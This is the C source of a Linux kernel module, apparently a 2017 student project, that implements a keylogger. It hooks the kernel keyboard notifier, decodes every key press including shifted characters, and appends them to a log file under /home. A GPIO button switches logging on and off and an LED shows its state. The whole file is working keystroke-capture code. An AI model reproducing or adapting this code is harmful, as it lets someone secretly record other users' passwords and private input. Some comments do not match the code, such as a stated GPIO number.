/*
* keylogger.c
*	A Module of a kernel, which implements a keylogger in the system
*	with Button as controller and LED as indicator if the system is working.
*	The Module registers a "spying" function in the Keyboard notifier.
*   The function listen to keyboard keys and writes them a log file.
*	In addition the LED indicates whether the system is working or not 
*   and the Button is the controller to turn on/off the system
*   while the Module is operating in the system.
*
* Authors:
* 	Eran Turjeman, <eran0079@gmail.com>
* 	Alexander Moshan, <alexmoshan@gmail.com>
*
* 	August 2017
*/
#include<linux/module.h>
#include<linux/kernel.h>
#include<linux/fs.h> 					/* This is the file structure, file open read close */
#include<linux/uaccess.h> 				/* This is for copy_user vice vers */
#include <linux/gpio.h>                 /* Required for the GPIO functions */
#include <linux/init.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>
#include <linux/ctype.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h>            /* Required for the IRQ code */
#include <linux/syscalls.h>
#include <linux/file.h>
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <linux/string.h>


/* A file path which is general to all the linux users. */
// "/home/*username*/Desktop/LogFile.txt" - for visual file
#define FILEPATH "/home/LogFile.txt"

MODULE_LICENSE("GPL");
MODULE_VERSION("1.5");
MODULE_AUTHOR("Eran Turjeman and Alexander Moshan");
MODULE_DESCRIPTION("Keylogger Module");

/* Lets go traditional C, declarations up, implementations down.*/
/* @@@@@@@@@@ Declarations @@@@@@@@@@ */

/*
* GPIO global variables to be used for LED and Button
* irq number for handling Button interupts.
* ledOn is boolean to indicate on LED status.
* jeffies to counter the Button bouncing.
*/
// LED: red cable(big metal connection) to groud, blue (Resistor) to gpio 27
// Button: yellow to gpio 22, white (R) to ground, orange to power.
static unsigned int gpioLED = 27;       ///< hard coding the LED gpio for this example to GPIO27
static unsigned int gpioButton = 22;   ///< hard coding the button gpio for this example to GPIO22
static unsigned int irqNumber;          ///< Used for button interrupt handler
static bool ledOn = false;          ///< Is the LED on or off? Used to invert its state (off by default)
static unsigned long old_jiffies = 0;  ///< counting old jiffies since last button press

/* 
* Keyboard mapping for both caps and non-caps keyboard keys for keyboard notifier function
*/
static const char* linuxKeyCode[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<-", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "\n", "*Ctrl*", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "*Shift*", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "*Shift*", "\0", "\0", " ", "*CapsLock*", "*F1*", "*F2*", "*F3*", "*F4*", "*F5*", "*F6*", "*F7*",
                        "*F8*", "*F9*", "*F10*", "*NumLock*", "*ScrollLock*", "*Num7*", "*Num8*", "*Num9*", "-", "*Num4*", "*Num5*",
                        "*Num6*", "+", "*Num1*", "*Num2*", "*Num3*", "*Num0*", ".", "\0", "\0", "\0", "*F11*", "*F12*",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\n", "*Ctrl*", "/", "*PrtScn*", "*Alt*", "\0", "*Home*",
                        "*Up*", "*PageUp*", "*Left*", "*Right*", "*End*", "*Down*", "*PageDown*", "*Insert*", "*Delete*", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "*Pause*"};

static const char* linuxKeyCodeShift[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "<-", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "\n", "*Ctrl*", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "*Shift*", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "*Shift*", "\0", "\0", " ", "*CapsLock*", "*F1*", "*F2*", "*F3*", "*F4*", "*F5*", "*F6*", "*F7*",
                        "*F8*", "*F9*", "*F10*", "*NumLock*", "*ScrollLock*", "*Num7*", "*Num8*", "*Num9*", "-", "*Num4*", "*Num5*",
                        "*Num6*", "+", "*Num1*", "*Num2*", "*Num3*", "*Num0*", ".", "\0", "\0", "\0", "*F11*", "*F12*",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "\n", "*Ctrl*", "/", "*PrtScn*", "*Alt*", "\0", "*Home*",
                        "*Up*", "*PageUp*", "*Left*", "*Right*", "*End*", "*Down*", "*PageDown*", "*Insert*", "*Delete*", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "*Pause*"};

/*
* Gloval variables for special key presses, 2 shifts and capslock
*/
static char leftShift = 0;
static char rightShift = 0;
static int capsLock = 0;
/*
* Buffer to hold the string text that will be written for every key press.
*/
static char buff[4096];

/*
* Function declaration for handling interrupts - irq_handler_t - implementation at the bottom.
*/
static irq_handler_t  my_irq_handler_fun(unsigned int irq, void *dev_id, struct pt_regs *regs);

/*
* Work queue struct to be used for our functions in queue
*/
static struct workqueue_struct *writequeue;

/*
* Debouncing button function to make sure its button press and not debounce
*/
static unsigned char debounce_button(void);

/*
* Function that opens a file and writes the buffer above into the file.
*/
static void write_file(char *filename, char *str);

/*
* Our queue function to be used in the workqueue declared above.
*/
static void my_queue_func(struct work_struct *work);

/*
* Signing up the work queue function as a "work" function for the queue thread.
*/
DECLARE_WORK(writting, my_queue_func);

/*
* Function to be sent to the keyboard notifier that will listen to keyboard interrupts
*/
int keylogger_function(struct notifier_block *nblock, unsigned long code, void *_param);

/*
* Notifier block struct as a pointer to our keyboard function
* to be registered in the keyboard notifier chain
*/
static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_function
};


/* @@@@@@@@@@@ Init/Exit kernel module @@@@@@@@@@@@ */

/*
* Initializing the module, registering all the GPIOs, the interrupt handler and keyboard events
* and assigning the workqueue and the gpio interrupt numbers
*/
static int __init init_keylogger(void)
{
    int result = 0;
    printk(KERN_INFO "Initializing Module...\n");
    
	/* Making sure the GPIO numbers we coded are valid for the hardware*/
    if (!gpio_is_valid(gpioLED)){
       printk(KERN_INFO "Invalid LED GPIO.\n");
       return -ENODEV;
    }else if(!gpio_is_valid(gpioButton))
    {
        printk(KERN_INFO "Invalid BTN GPIO.\n");
        return -ENODEV;
    }
    /*LED init*/
    ledOn = false;
    gpio_request(gpioLED, "sysfs");          // gpioLED is hardcoded to 49, request it
    gpio_direction_output(gpioLED, ledOn);   // Set the gpio to be in output mode and off

    /*Button init*/
    gpio_request(gpioButton, "sysfs");       // Set up the gpioButton
    gpio_direction_input(gpioButton);        // Set the button GPIO to be an input
    gpio_set_debounce(gpioButton, 1000);      // Debounce the button with a delay of 1000ms

    /* Requesting the interrupt number assigned to our GPIO button */
    irqNumber = gpio_to_irq(gpioButton);

    /* Requesting to assign our interrupt handler to the button GPIO interrupt */
    result = request_irq(irqNumber,             // The interrupt number requested
                         (irq_handler_t) my_irq_handler_fun, // The pointer to the handler function below
                         IRQF_TRIGGER_RISING,   // Interrupt on rising edge (button press, not release)
                         "ETSM_gpio_handler",    // Used in /proc/interrupts to identify the owner
                         NULL);                 
	/* Checking if request succsseded before we continue */
	if(result){
		gpio_free(gpioLED); 
		gpio_free(gpioButton);
		printk(KERN_INFO "Failed to assign an interrupt.\n");
        return -ENODEV;
	}
	
	/* Assigning our workqueue */
    writequeue = create_singlethread_workqueue("writing_Key");
	
	/* Registering our notifier block with the pointer to keylogger function
	*  to the keyboard notifier chain to be executed on keyboard event. */
    register_keyboard_notifier(&keylogger_nb);
    
	printk(KERN_INFO "Initialization is complete.\n\t\tI Am waiting to be awakened...\n");
    return result;
}

/*
* Finalizing the module work, removing and cleaning the GPIOs, interrupt handler and workqueue
*/
static void __exit cleanup_keylogger(void)
{
    printk(KERN_INFO "Closing the module...\n");
    
	/* Removing our function from the keyboard notifier chain */
	unregister_keyboard_notifier(&keylogger_nb);
	
    /* Closing and deleting the GPIOs */
    gpio_set_value(gpioLED, 0);              // Turn the LED off, makes it clear the device was unloaded
    free_irq(irqNumber, NULL);               // Free the irq number
    gpio_free(gpioLED);                      // Free the LED GPIO
    gpio_free(gpioButton);                   // Free the Button GPIO

    /* Closing and cleaning the queue */
    cancel_work_sync(&writting);			// Closing all work
    flush_workqueue(writequeue);			// Flushing the workqueue
    destroy_workqueue(writequeue);			// Removing the workqueue

    printk(KERN_INFO "Module Closed. See you next time.\n");
}

/* @@@@@@@@@ Implementations @@@@@@@@@@@@ */

/* 
* Function to prevent mechanical bouncing of the button
* if the number of jiffies passsed is too small, then the button is bouncing
* else its the real button being pressed.
*/
static unsigned char debounce_button(void){
	unsigned long diff = jiffies - old_jiffies; // Time diff between last succssesful Button press
	if(diff < 100){
		return 0;
	}
	old_jiffies = jiffies;  					// Update the time the succssesful press happened
	return 1;
}

/* Function that writes the buffer to a file */
static void write_file(char *filename,  char *str)
{
    struct file *filp;
    mm_segment_t old_fs = get_fs();
    set_fs(get_ds());

	/* Open the file in the desired path */
    filp = filp_open(filename, O_RDWR | O_CREAT| O_APPEND, 0444);
    if (IS_ERR(filp)) {
        printk("open error\n");
        return;
    }
    /* Write */
    vfs_write(filp, str, strlen(str), &filp->f_pos);

    filp_close(filp, NULL);
    /* Restore kernel memory setting */
    set_fs(old_fs);
}

/* Function to be exectured in the work queue - the writing to file function*/
static void my_queue_func(struct work_struct *work)
{
	   write_file(FILEPATH,buff);
}

/* 
* Function to be sent to the keyboard notifier block
* the function decodes the key pressed, writes it to the buffer if needed
* and sends the "write_file" function to the workqueue to be executed if the module is in "listening" mode
*/
int keylogger_function(struct notifier_block *nblock, unsigned long code, void *_param)
{
	/* Extract info from the keyboard notifier param */
    struct keyboard_notifier_param *param = _param;
    int key = param->value;
    char pressed = param->down;

	/* Check if the module is working */
    if(!ledOn){
			return NOTIFY_OK;
    }
	
	/* Decode the key pressed and do fitting action */
    if (code == KBD_KEYCODE)
    {
        if( key==42 )
        {
            if(pressed){
                leftShift = 1;
              }
            else{
                leftShift = 0;
              }
            return NOTIFY_OK;
        }
        else if(key==54)
        {
            if(pressed){
                rightShift = 1;
              }
            else{
                rightShift = 0;
              }
            return NOTIFY_OK;
        }

        else if(key == 58)
        {
            //Capslock on
            if(!pressed)
                capsLock++;
        }

        if(pressed)
        {
            /* Check fiting buttons conditions regarding lower/upper case of keys. */
			/* The commented functions are optional if you want to see in the "dmesg" the key pressed. */
            if(capsLock%2 == 1 && ((key>15 && key<26) || (key > 29 && key < 39) || (key > 43 && key < 51))){
				if(leftShift == 0 && rightShift == 0){
					//printk(KERN_INFO "%s, %i \n", linuxKeyCodeShift[key],key);
					strcpy(buff, linuxKeyCodeShift[key]);
					queue_work(writequeue, &writting);
                }
				else{
					//printk(KERN_INFO "%s, %i \n", linuxKeyCode[key],key);
					strcpy(buff, linuxKeyCode[key]);
					queue_work(writequeue, &writting);
				}
            }
            else{
				if(leftShift == 0 && rightShift == 0){
					//printk(KERN_INFO "%s, %i \n",linuxKeyCode[key],key);
					strcpy(buff, linuxKeyCode[key]);
					queue_work(writequeue, &writting);
                }
				else{
					//printk(KERN_INFO "%s, %i \n", linuxKeyCodeShift[key],key);
					strcpy(buff, linuxKeyCodeShift[key]);
					queue_work(writequeue, &writting);
                }
            }
        }
    }

    return NOTIFY_OK;
}

/*
* Function to register to the interupt button handler 
* it will change the button status and will note if its in listening mode or on hold
*/
static irq_handler_t my_irq_handler_fun(unsigned int irq, void *dev_id, struct pt_regs *regs){
	if(debounce_button() == 0){
		return (irq_handler_t) IRQ_HANDLED;
	}
	ledOn = !ledOn;                          // Invert the LED state on each button press
	gpio_set_value(gpioLED, ledOn);          // Set the physical LED accordingly

	if(ledOn){
		printk(KERN_INFO "I am listening...\n");
	}
	else{
		printk(KERN_INFO "I am on hold...\n");
	}

	return (irq_handler_t) IRQ_HANDLED;      // Announce that the IRQ has been handled correctly
}

/* Macros that were added to the kernel module api to init/remove the modules */
module_init(init_keylogger);
module_exit(cleanup_keylogger);